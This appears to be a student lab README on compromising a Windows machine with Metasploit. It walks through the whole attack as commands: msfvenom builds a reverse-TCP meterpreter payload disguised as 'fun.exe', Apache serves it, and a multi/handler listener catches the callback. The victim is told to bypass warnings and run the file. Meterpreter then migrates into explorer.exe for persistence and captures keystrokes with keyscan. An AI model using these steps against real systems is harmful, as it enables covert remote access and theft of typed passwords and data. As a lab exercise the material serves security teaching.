# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
copy the fun.exe into the apache /var/www/html folder img03

Start apache server sudo systemctl apache2 start

img04

Check the status of apache2 img05

Invoke msfconsole:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit img06

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads. img07

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit img08

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted img09

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name. img010

keyscan_dump Shows the keystrokes captured so far 

![Screenshot (170)](https://github.com/user-attachments/assets/f4f4388b-6404-4245-adad-31bffd4952ee)
![Screenshot (171)](https://github.com/user-attachments/assets/06569056-61bd-4df0-9d87-2fae35861031)
![Screenshot (172)](https://github.com/user-attachments/assets/dde32207-6a04-472d-896a-c25be276096a)
![Screenshot (174)](https://github.com/user-attachments/assets/e6330a9a-8633-4d45-b538-f996fbb2bf1e)
![Uploading Screenshot (175).png…]()

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
